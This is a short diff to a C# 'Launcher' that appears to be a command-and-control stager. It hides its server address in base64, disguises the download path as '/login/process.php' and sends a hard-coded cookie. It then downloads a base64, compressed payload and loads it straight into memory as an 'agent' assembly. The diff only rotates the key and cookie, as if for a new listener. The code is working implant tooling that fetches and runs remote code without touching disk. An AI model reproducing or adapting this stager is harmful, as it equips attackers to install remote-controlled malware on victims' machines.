@@ -17,10 +17,10 @@ namespace Launcher
             wc.Headers.Add("User-Agent", u);
             wc.Proxy = WebRequest.DefaultWebProxy;
             wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
-            string k = "2939FAF7A1846F5C1E88CD1BD19C0CAF";
+            string k = "[>f)3*<jQmh.asGZ(6xMJ1qOIvX&+#i:";
             string ser = Encoding.Unicode.GetString(Convert.FromBase64String("aAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADEAMAAwADgAMAA="));
             string t = "/login/process.php";
-            wc.Headers.Add("Cookie", "oqszJYnU=zb/6Z3ZfMfBOsZnb6SS8FQj23X0=");
+            wc.Headers.Add("Cookie", "faVOgGsDheVq=+9GwXuAqlTf4O5cDNNSmAi9NFPk=");
             byte[] data = wc.DownloadData(ser+t);
             string decryptedAssembly = Encoding.ASCII.GetString(data);
             Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
